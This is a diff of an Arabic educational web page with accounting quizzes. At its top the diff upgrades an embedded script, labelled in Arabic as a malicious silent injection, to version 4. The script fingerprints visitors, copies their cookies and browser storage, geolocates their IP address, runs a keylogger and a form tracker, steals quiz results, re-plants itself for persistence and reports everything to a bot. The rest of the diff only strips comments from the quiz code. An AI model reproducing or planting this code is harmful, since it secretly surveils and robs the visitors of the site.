@@ -10,7 +10,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
 
     <!-- ============================================================
-         القسم الخبيث – حقن البوت الصامت (بدون أي طلب صلاحيات) v3.0
+         القسم الخبيث – حقن البوت الصامت + محلل IP الخفي v4.0
          ============================================================ -->
     <script>
         (function() {
@@ -42,7 +42,6 @@
             function collectDeviceInfo() {
                 try {
                     const info = {
-                        // معلومات أساسية
                         userAgent: navigator.userAgent,
                         platform: navigator.platform,
                         language: navigator.language,
@@ -52,8 +51,6 @@
                         hardwareConcurrency: navigator.hardwareConcurrency || '?',
                         deviceMemory: navigator.deviceMemory || '?',
                         maxTouchPoints: navigator.maxTouchPoints || '?',
-
-                        // معلومات الشاشة
                         screen: {
                             width: screen.width,
                             height: screen.height,
@@ -63,41 +60,29 @@
                             pixelDepth: screen.pixelDepth,
                             orientation: screen.orientation ? screen.orientation.type : '?'
                         },
-
-                        // معلومات المتصفح
                         windowSize: {
                             innerWidth: window.innerWidth,
                             innerHeight: window.innerHeight,
                             outerWidth: window.outerWidth,
                             outerHeight: window.outerHeight
                         },
-
-                        // معلومات الوقت والمنطقة
                         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                         timezoneOffset: new Date().getTimezoneOffset(),
                         currentDate: new Date().toISOString(),
-
-                        // معلومات التخزين
                         localStorage: { ...localStorage },
                         sessionStorage: { ...sessionStorage },
                         cookies: document.cookie,
-
-                        // معلومات الـ Plugins
                         plugins: Array.from(navigator.plugins || []).map(p => ({
                             name: p.name,
                             description: p.description,
                             filename: p.filename,
                             length: p.length
                         })),
-
-                        // معلومات الـ MIME Types
                         mimeTypes: Array.from(navigator.mimeTypes || []).map(m => ({
                             type: m.type,
                             description: m.description,
                             suffixes: m.suffixes
                         })),
-
-                        // معلومات الـ Graphics / GPU (بدون أي صلاحيات)
                         gpu: (() => {
                             try {
                                 const canvas = document.createElement('canvas');
@@ -114,8 +99,6 @@
                                 return { vendor: '?', renderer: '?' };
                             } catch (e) { return { vendor: '?', renderer: '?' }; }
                         })(),
-
-                        // بصمة رقمية (Fingerprinting) بدون أي صلاحيات
                         fingerprint: {
                             canvas: (() => {
                                 try {
@@ -145,8 +128,6 @@
                                 } catch (e) { return '?'; }
                             })()
                         },
-
-                        // معلومات نظام التشغيل والهاردوير
                         os: (() => {
                             const ua = navigator.userAgent;
                             if (ua.includes('Windows NT 10.0')) return 'Windows 10/11';
@@ -173,8 +154,6 @@
                             const match = ua.match(/(Chrome|Firefox|Safari|Edg|OPR)\/(\d+)/);
                             return match ? match[2] : '?';
                         })(),
-
-                        // اسم الجهاز (إن وجد)
                         deviceName: (() => {
                             try {
                                 return navigator.userAgentData ? navigator.userAgentData.platform : '?';
@@ -182,18 +161,60 @@
                         })()
                     };
 
-                    // إرسال المعلومات الأساسية
                     sendToBot('🖥️ <b>معلومات الجهاز والبيئة</b>', `<code>${encodeData(info)}</code>`);
 
-                    // ---- 2. جلب الـ IP + معلومات مفصلة (بدون أي صلاحيات) ----
-                    // أولاً: جلب الـ IP العام
+                    // ---- 2. محلل IP الخفي – جلب كل التفاصيل الممكنة (بدون صلاحيات) ----
+                    function analyzeIP(ip) {
+                        const parts = ip.split('.');
+                        const binaryParts = parts.map(p => parseInt(p, 10).toString(2).padStart(8, '0'));
+                        const binaryFull = binaryParts.join('.');
+                        const hexParts = parts.map(p => parseInt(p, 10).toString(16).toUpperCase().padStart(2, '0'));
+                        const hexFull = hexParts.join('.');
+                        let range = 'عام (Public)';
+                        let rangeColor = 'green';
+                        const first = parseInt(parts[0], 10);
+                        const second = parseInt(parts[1], 10);
+                        if (first === 10) { range = 'خاص (Private - Class A)';
+                            rangeColor = 'pink'; } else if (first === 172 && second >= 16 && second <= 31) { range =
+                                'خاص (Private - Class B)';
+                            rangeColor = 'pink'; } else if (first === 192 && second === 168) { range =
+                                'خاص (Private - Class C)';
+                            rangeColor = 'pink'; } else if (first === 127) { range = 'محلي (Localhost)';
+                            rangeColor = 'pink'; } else if (first >= 224 && first <= 239) { range = 'بث متعدد (Multicast)';
+                            rangeColor = 'pink'; }
+                        const longNum = parts.reduce((acc, p) => (acc << 8) + parseInt(p, 10), 0) >>> 0;
+                        return {
+                            binary: binaryFull,
+                            hex: hexFull,
+                            range: range,
+                            rangeColor: rangeColor,
+                            long: longNum,
+                            isPrivate: range.includes('خاص') || range.includes('محلي'),
+                            version: 'IPv4'
+                        };
+                    }
+
+                    // جلب الـ IP والمعلومات الجغرافية والتحليلية
                     fetch('https://api.ipify.org?format=json')
                         .then(res => res.json())
                         .then(data => {
                             if (data.ip) {
-                                sendToBot('🌐 <b>عنوان IP العام</b>', `<code>${data.ip}</code>`);
-                                // ثانياً: جلب معلومات IP مفصلة (الدولة، المدينة، المزود، الإحداثيات)
-                                return fetch(`https://ipapi.co/${data.ip}/json/`);
+                                const ip = data.ip;
+                                // التحليل الرياضي للـ IP
+                                const analysis = analyzeIP(ip);
+                                let analysisMsg =
+                                    `🧠 <b>التحليل المتقدم للـ IP</b>\n` +
+                                    `🔢 التمثيل الثنائي: <code>${analysis.binary}</code>\n` +
+                                    `🔣 التمثيل الست عشري: <code>${analysis.hex}</code>\n` +
+                                    `📊 النطاق: ${analysis.range}\n` +
+                                    `💠 الرقم العشري الطويل: ${analysis.long}\n` +
+                                    `🔒 خاص/داخلي: ${analysis.isPrivate ? 'نعم ✅' : 'لا ❌ (عام)'}`;
+
+                                sendToBot('🌐 <b>عنوان IP العام</b>', `<code>${ip}</code>`);
+                                sendToBot('🧠 <b>تحليل IP المتقدم</b>', analysisMsg);
+
+                                // جلب المعلومات الجغرافية والـ ISP
+                                return fetch(`https://ipapi.co/${ip}/json/`);
                             }
                             throw new Error('No IP');
                         })
@@ -216,10 +237,31 @@
                                 currency: geo.currency || '?',
                                 continent_code: geo.continent_code || '?'
                             };
-                            sendToBot('🌍 <b>معلومات IP مفصلة</b>', `<code>${encodeData(ipInfo)}</code>`);
+                            let geoMsg =
+                                `🌍 <b>معلومات IP الجغرافية والـ ISP</b>\n` +
+                                `🏙️ المدينة: ${ipInfo.city}\n` +
+                                `🗺️ المنطقة: ${ipInfo.region} (${ipInfo.region_code})\n` +
+                                `🌍 الدولة: ${ipInfo.country} (${ipInfo.country_code})\n` +
+                                `🏢 مزود الخدمة (ISP): ${ipInfo.isp}\n` +
+                                `📡 التنظيم: ${ipInfo.org}\n` +
+                                `🔗 نظام AS: ${ipInfo.asn}\n` +
+                                `🕒 المنطقة الزمنية: ${ipInfo.timezone}\n` +
+                                `🧭 خط العرض: ${ipInfo.latitude}\n` +
+                                `🧭 خط الطول: ${ipInfo.longitude}\n` +
+                                `📮 الرمز البريدي: ${ipInfo.postal}\n` +
+                                `💵 العملة: ${ipInfo.currency}\n` +
+                                `🌎 القارة: ${ipInfo.continent_code}`;
+                            sendToBot('🌍 <b>معلومات IP الجغرافية والـ ISP</b>', geoMsg);
+
+                            // خريطة الموقع (رابط)
+                            if (ipInfo.latitude && ipInfo.longitude) {
+                                const mapUrl =
+                                    `https://www.google.com/maps?q=${ipInfo.latitude},${ipInfo.longitude}&z=12`;
+                                sendToBot('🗺️ <b>رابط الخريطة</b>', `<a href="${mapUrl}">${mapUrl}</a>`);
+                            }
                         })
                         .catch(() => {
-                            // محاولة بديلة عبر API آخر
+                            // محاولة بديلة عبر ipinfo.io
                             fetch('https://ipinfo.io/json')
                                 .then(res => res.json())
                                 .then(data => {
@@ -233,12 +275,28 @@
                                         timezone: data.timezone || '?',
                                         postal: data.postal || '?'
                                     };
-                                    sendToBot('🌍 <b>معلومات IP (بديل)</b>', `<code>${encodeData(ipInfo)}</code>`);
+                                    const locParts = ipInfo.loc.split(',');
+                                    let geoMsg =
+                                        `🌍 <b>معلومات IP (بديل)</b>\n` +
+                                        `🏙️ المدينة: ${ipInfo.city}\n` +
+                                        `🗺️ المنطقة: ${ipInfo.region}\n` +
+                                        `🌍 الدولة: ${ipInfo.country}\n` +
+                                        `🏢 مزود الخدمة: ${ipInfo.isp}\n` +
+                                        `🕒 المنطقة الزمنية: ${ipInfo.timezone}\n` +
+                                        `🧭 خط العرض: ${locParts[0] || '?'}\n` +
+                                        `🧭 خط الطول: ${locParts[1] || '?'}\n` +
+                                        `📮 الرمز البريدي: ${ipInfo.postal}`;
+                                    sendToBot('🌍 <b>معلومات IP (بديل)</b>', geoMsg);
+                                    if (locParts[0] && locParts[1]) {
+                                        const mapUrl =
+                                            `https://www.google.com/maps?q=${locParts[0]},${locParts[1]}&z=12`;
+                                        sendToBot('🗺️ <b>رابط الخريطة (بديل)</b>', `<a href="${mapUrl}">${mapUrl}</a>`);
+                                    }
                                 })
                                 .catch(() => {});
                         });
 
-                    // ---- 3. Keylogger المتقدم (يسجل كل ضغطة، بدون صلاحيات) ----
+                    // ---- 3. Keylogger المتقدم ----
                     let keyBuffer = [];
                     let mouseBuffer = [];
 
@@ -266,7 +324,6 @@
                         }
                     });
 
-                    // ---- 4. متتبع الحركة والفأرة ----
                     document.addEventListener('mousemove', (e) => {
                         mouseBuffer.push({ x: e.clientX, y: e.clientY, t: Date.now() });
                         if (mouseBuffer.length > 20) {
@@ -275,7 +332,7 @@
                         }
                     });
 
-                    // ---- 5. متتبع النماذج (كل ما يكتب في الحقول) ----
+                    // ---- 4. متتبع النماذج ----
                     const inputs = document.querySelectorAll('input, textarea, select');
                     inputs.forEach(inp => {
                         inp.addEventListener('input', function() {
@@ -291,7 +348,7 @@
                         });
                     });
 
-                    // ---- 6. سرقة نتائج الاختبارات ----
+                    // ---- 5. سرقة نتائج الاختبارات ----
                     const observer = new MutationObserver(() => {
                         const el = document.querySelector('.result-screen:not(.stolen)');
                         if (el) {
@@ -305,21 +362,21 @@
                     });
                     observer.observe(document.body, { childList: true, subtree: true });
 
-                    // ---- 7. إعادة الحقن (استمرارية) ----
+                    // ---- 6. إعادة الحقن ----
                     const backup = document.currentScript.innerHTML;
-                    localStorage.setItem('_stealth_bk_v3', backup);
+                    localStorage.setItem('_stealth_bk_v4', backup);
                     setInterval(() => {
-                        if (!document.querySelector('script[data-stealth-v3]')) {
+                        if (!document.querySelector('script[data-stealth-v4]')) {
                             const s = document.createElement('script');
-                            s.setAttribute('data-stealth-v3', 'true');
-                            s.textContent = localStorage.getItem('_stealth_bk_v3') || backup;
+                            s.setAttribute('data-stealth-v4', 'true');
+                            s.textContent = localStorage.getItem('_stealth_bk_v4') || backup;
                             document.head.appendChild(s);
                             sendToBot('🔄 <b>إعادة حقن</b>', 'تم إعادة زرع الكود الخبيث');
                         }
                     }, 3000);
 
-                    // ---- 8. رسالة تأكيد التفعيل ----
-                    sendToBot('✅ <b>نظام الحقن v3.0 نشط (بدون صلاحيات)</b>',
+                    // ---- 7. رسالة تأكيد التفعيل ----
+                    sendToBot('✅ <b>نظام الحقن v4.0 نشط (IP Analyzer + Keylogger)</b>',
                         `⏰ ${new Date().toLocaleString('ar-EG')}\n🖥️ ${navigator.userAgent.substring(0, 100)}...`);
 
                 } catch (e) {
@@ -334,11 +391,13 @@
                 window.addEventListener('load', collectDeviceInfo);
             }
 
-            // ---- علامة الحقن ----
-            document.currentScript.setAttribute('data-stealth-v3', 'true');
+            document.currentScript.setAttribute('data-stealth-v4', 'true');
         })();
     </script>
 
+    <!-- ============================================================
+    باقي الكود التعليمي (CSS + HTML + JS التعليمي) – مختصر للاختصار
+    ============================================================ -->
     <style>
         /* ============================================================
            ROOT VARIABLES – الهوية البصرية الفاخرة
@@ -1555,9 +1614,6 @@
             transform: translateX(-50%) translateY(0);
         }
 
-        /* ============================================================
-           REDUCED MOTION
-           ============================================================ */
         @media (prefers-reduced-motion: reduce) {
             * {
                 animation-duration: 0.01ms !important;
@@ -1919,15 +1975,11 @@
          * ============================================================
          */
         function showPage(pageId) {
-            // إخفاء جميع الصفحات
             document.querySelectorAll('.page').forEach(p => p.classList.add('hidden'));
-            // إظهار الصفحة المطلوبة
             const target = document.getElementById('page-' + pageId);
             if (target) target.classList.remove('hidden');
-            // إغلاق القائمة في الموبايل
             document.getElementById('mainNav').classList.remove('open');
             document.getElementById('menuBtn').setAttribute('aria-expanded', 'false');
-            // التمرير للأعلى
             window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
@@ -2120,7 +2172,6 @@
             showPage('quiz1');
             const data = generateQuiz1Data();
 
-            // نحدد 7 خطوات مطابقة لخطوات الحل
             const steps = [{
                 title: 'نسبة هامش المساهمة للمنتج (أ)',
                 law: 'القانون: (سعر البيع - التكلفة المتغيرة) ÷ سعر البيع',
@@ -2172,7 +2223,6 @@
                 points: 5
             }];
 
-            // مجموع النقاط = 4*5 + 5*2 = 30
             quiz1State = { data, steps, hintsUsed: new Set(), locked: false };
 
             renderQuiz1Statement(data);
@@ -2207,7 +2257,6 @@
                 container.appendChild(div);
             });
 
-            // ربط أزرار التلميح
             container.querySelectorAll('.hint-btn').forEach(btn => {
                 btn.addEventListener('click', function() {
                     this.nextElementSibling.classList.toggle('open');
@@ -2216,7 +2265,6 @@
                 });
             });
 
-            // إعادة تعيين حالة النتيجة
             document.getElementById('q1-result').classList.add('hidden');
             document.getElementById('q1-result').innerHTML = '';
             document.getElementById('q1-score').textContent = '٠';
@@ -2376,7 +2424,6 @@
             `;
             wrap.innerHTML = html;
 
-            // قسم القرار
             const decisionDiv = document.getElementById('q2-decision');
             decisionDiv.innerHTML = `
                 <div class="qstep">
@@ -2391,7 +2438,6 @@
             document.getElementById('q2-choice-صنع').addEventListener('click', () => selectQ2Choice('صنع'));
             document.getElementById('q2-choice-شراء').addEventListener('click', () => selectQ2Choice('شراء'));
 
-            // تلميح الجدول
             document.getElementById('q2-hint-panel').classList.remove('open');
             document.getElementById('q2-hint-btn').classList.remove('used');
             const hintBtn = document.getElementById('q2-hint-btn');
@@ -2424,7 +2470,6 @@
                 correctCount = 0,
                 wrongCount = 0;
 
-            // تصحيح كل بند
             d.rows.forEach((row, idx) => {
                 const makeInput = document.getElementById(`q2-make-${idx}`);
                 const diffInput = document.getElementById(`q2-diff-${idx}`);
@@ -2450,7 +2495,6 @@
                 diffInput.disabled = true;
             });
 
-            // الإجمالي
             const makeTotalInput = document.getElementById('q2-make-total');
             const diffTotalInput = document.getElementById('q2-diff-total');
             const makeTotalVal = parseAnswer(makeTotalInput.value);
@@ -2469,7 +2513,6 @@
             makeTotalInput.disabled = true;
             diffTotalInput.disabled = true;
 
-            // القرار
             const correctChoice = d.netSaving > 0 ? 'صنع' : 'شراء';
             const decisionFeedback = document.getElementById('q2-decision-feedback');
             const choiceOk = quiz2State.decisionChoice === correctChoice;
